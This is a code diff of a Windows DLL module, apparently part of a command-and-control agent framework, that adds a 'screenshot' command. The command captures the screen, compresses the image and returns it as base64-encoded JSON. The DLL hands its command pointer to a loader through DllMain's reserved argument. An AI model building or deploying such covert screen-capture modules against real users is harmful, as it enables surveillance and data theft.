@@ -24,52 +24,22 @@ def bmp():
 #include "zlib/zlib.h"
 #include "cJSON\cJSON.h"
 
-// Convert DataBlobs struct to JSON string
-char* BlobsToJson(DataBlobs* data) {
-    if (!data) {
-        return NULL;
-    }
-
-    cJSON* jsonData = cJSON_CreateObject();
-    cJSON* jsonBuffers = cJSON_CreateArray();
-
-    for (int i = 0; i < data->count; ++i) {
-        cJSON* jsonBuffer = cJSON_CreateObject();
-        cJSON_AddNumberToObject(jsonBuffer, "size", data->sizes[i]);
-        
-        // Encode buffer as a base64 string
-        char* base64Buffer = (char*)malloc(((data->sizes[i] + 2) / 3) * 4 + 1);
-        if (!base64Buffer) {
-            cJSON_Delete(jsonData);
-            return NULL;
-        }
-        int base64Length = Base64Encode(data->buffers[i], data->sizes[i], base64Buffer);
-        base64Buffer[base64Length] = '\0';
-        
-        cJSON_AddStringToObject(jsonBuffer, "data", base64Buffer);
-        free(base64Buffer);
-
-        cJSON_AddItemToArray(jsonBuffers, jsonBuffer);
-    }
-
-    cJSON_AddNumberToObject(jsonData, "count", data->count);
-    cJSON_AddItemToObject(jsonData, "buffers", jsonBuffers);
-
-    char* jsonString = cJSON_Print(jsonData);
-    cJSON_Delete(jsonData);
-
-    return jsonString;
-}
-
 #include <Windows.h>
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
 
 unsigned char* CompressData(unsigned char* data, unsigned long dataSize, unsigned long* compressedSize);
-void TakeScreenShot(DataBlobs* dbData);
+char* TakeScreenShot(char *args);
+char* BlobsToJson(DataBlobs* data);
 
-CommandNode *main_cmd;
-#define DEBUG
+CommandNode* ModuleCommand;
+
+__declspec(dllexport) CommandNode* GetModuleCommand(void)
+{
+    ModuleCommand = createCommandNode("screenshot", TakeScreenShot);
+    return ModuleCommand;
+}
+
 #ifdef DEBUG
 __declspec(dllexport) void MainExport(char* args)
 {
@@ -90,14 +60,35 @@ __declspec(dllexport) void MainExport(char* args)
     fflush(fd);
     fclose(fd);
 }
-
-__declspec(dllexport) void TestModuleCommand(void)
-{
-    main_cmd = createCommandNode("screenshot", MainExport);    
-}
 #endif
 
-void TakeScreenShot(DataBlobs* dbData) {
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    MessageBox(NULL, "DLL Loaded!", "DLL Loaded!", MB_ICONINFORMATION);
+    switch (fdwReason) {
+        case DLL_PROCESS_ATTACH:
+            // DLL is being loaded
+            if( lpReserved != NULL )
+            {
+                MessageBox(NULL, "Setting lpReserved!", "d", MB_ICONINFORMATION);
+				// *(HMODULE *)lpReserved = ShowMessageBox;
+                *(CommandNodePointer*)lpReserved = GetModuleCommand;
+            }
+            break;
+        case DLL_PROCESS_DETACH:
+            // DLL is being unloaded
+            break;
+        case DLL_THREAD_ATTACH:
+            // A new thread is being created in the process
+            break;
+        case DLL_THREAD_DETACH:
+            // A thread is exiting cleanly
+            break;
+    }
+    return TRUE; // Successful DLL_PROCESS_ATTACH.
+}
+
+char* TakeScreenShot(char* args)
+{
     HDC              hdc     = NULL;
     unsigned long*   bmpFile = NULL;
     BITMAPFILEHEADER bmpFileHeader;
@@ -172,16 +163,16 @@ void TakeScreenShot(DataBlobs* dbData) {
         memcpy((char*)bmpFile + sizeof(BITMAPFILEHEADER), &bmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER));
     }
 
-    // Clean-up
-    if (hMemoryDC) { DeleteDC(hMemoryDC); }
-    if (hScreenDC) { DeleteDC(hScreenDC); }
-    if (hdc) { ReleaseDC(NULL, hdc); }
-
     //Compress
     unsigned long compressedSize;
     unsigned char* compressedData = CompressData((unsigned char*)bmpFile, (*(BITMAPFILEHEADER*)(bmpFile)).bfSize, &compressedSize);
 
     if (bmpFile) {free(bmpFile); }
+
+    DataBlobs *dbData = (DataBlobs*)malloc(sizeof(DataBlobs));
+    dbData->buffers = NULL;
+    dbData->sizes = NULL;
+    dbData->count = 0;
 
     dbData->buffers = (unsigned char**)realloc(dbData->buffers, (dbData->count + 1) * sizeof(unsigned char*));
     dbData->sizes = (unsigned long*)realloc(dbData->sizes, (dbData->count + 1) * sizeof(unsigned long));
@@ -189,8 +180,58 @@ void TakeScreenShot(DataBlobs* dbData) {
     dbData->buffers[dbData->count] = compressedData;
     dbData->sizes[dbData->count] = compressedSize;
     dbData->count++;
+    
+    // json string to return
+    char* data = BlobsToJson(dbData);
+
+    // Clean-up
+    if (hMemoryDC) { DeleteDC(hMemoryDC); }
+    if (hScreenDC) { DeleteDC(hScreenDC); }
+    if (hdc) { ReleaseDC(NULL, hdc); }
+    if (dbData) {FreeBlobs(dbData);}
+    // if (compressedData) {free(compressedData);} // This gets free'd when the blob is freed
+    return data;
 }
 
+// Convert DataBlobs struct to JSON string
+char* BlobsToJson(DataBlobs* data) {
+    if (!data) {
+        return NULL;
+    }
+
+    cJSON* jsonData = cJSON_CreateObject();
+    cJSON* jsonBuffers = cJSON_CreateArray();
+
+    for (int i = 0; i < data->count; ++i) {
+        cJSON* jsonBuffer = cJSON_CreateObject();
+        cJSON_AddNumberToObject(jsonBuffer, "size", data->sizes[i]);
+        
+        // Encode buffer as a base64 string
+        char* base64Buffer = (char*)malloc(((data->sizes[i] + 2) / 3) * 4 + 1);
+        if (!base64Buffer) {
+            cJSON_Delete(jsonData);
+            return NULL;
+        }
+        int base64Length = Base64Encode(data->buffers[i], data->sizes[i], base64Buffer);
+        base64Buffer[base64Length] = '\0';
+        
+        cJSON_AddStringToObject(jsonBuffer, "data", base64Buffer);
+        free(base64Buffer);
+
+        cJSON_AddItemToArray(jsonBuffers, jsonBuffer);
+    }
+
+    cJSON_AddNumberToObject(jsonData, "count", data->count);
+    cJSON_AddItemToObject(jsonData, "buffers", jsonBuffers);
+
+    char* jsonString = cJSON_Print(jsonData);
+    cJSON_Delete(jsonData);
+
+    return jsonString;
+}
+
+
+// This uses zlib to compress
 unsigned char* CompressData(unsigned char* data, unsigned long dataSize, unsigned long* compressedSize)
 {
     uLongf destLen = compressBound(dataSize);
